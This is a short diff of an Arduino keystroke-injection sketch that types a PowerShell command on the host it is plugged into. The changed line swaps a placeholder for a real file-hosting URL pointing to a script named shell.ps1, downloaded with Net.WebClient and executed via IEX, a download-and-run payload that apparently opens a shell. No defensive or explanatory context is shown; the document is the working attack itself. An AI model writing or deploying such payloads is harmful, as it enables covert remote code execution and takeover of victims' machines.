@@ -24,7 +24,7 @@ void setup()
 
   delay(100);
 
-  Keyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('.ps1 link here');\"");
+  Keyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://download948.mediafire.com/4wtkhy1w2wzg/ybm3s9132skmqm1/shell.ps1');\"");
 
   Keyboard.press(KEY_RETURN);
 
